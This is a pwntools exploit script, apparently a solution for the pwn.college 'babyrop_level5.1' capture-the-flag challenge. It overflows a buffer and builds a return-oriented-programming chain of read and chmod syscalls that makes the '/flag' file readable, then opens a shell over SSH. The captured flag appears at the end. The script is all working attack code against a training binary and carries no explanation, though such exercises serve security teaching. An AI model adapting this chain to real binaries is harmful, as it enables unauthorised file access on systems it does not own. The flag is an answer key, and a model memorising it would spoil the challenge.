from pwn import *

elf = ELF("./babyrop_level5.1")
s = ssh(host="dojo.pwn.college", user="hacker", keyfile="~/key")
pop_rax = 0x00000000004014f2
pop_rdi = 0x00000000004014da
pop_rsi = 0x00000000004014e2
pop_rdx = 0x00000000004014ea
syscall = 0x00000000004014d2
pos = elf.bss() + 0x100

io = s.process("/challenge/babyrop_level5.1")

chain =  b'a'*0x78
chain += p64(pop_rax) + p64(0)    + p64(pop_rdi) + p64(0)   + p64(pop_rsi) + p64(pos) + p64(pop_rdx) + p64(0x100) + p64(syscall)
chain += p64(pop_rax) + p64(0x5a) + p64(pop_rdi) + p64(pos) + p64(pop_rsi) + p64(7)   + p64(syscall)
io.send(chain)
io.send(b'/flag\x00')

io.close()

sh = s.shell(b'/bin/sh')
sh.interactive()
# Flag: pwn.college{kBdoqojqtlkTYLQ2CtHVQCLFWxP.0FM1MDLxIjNyEzW}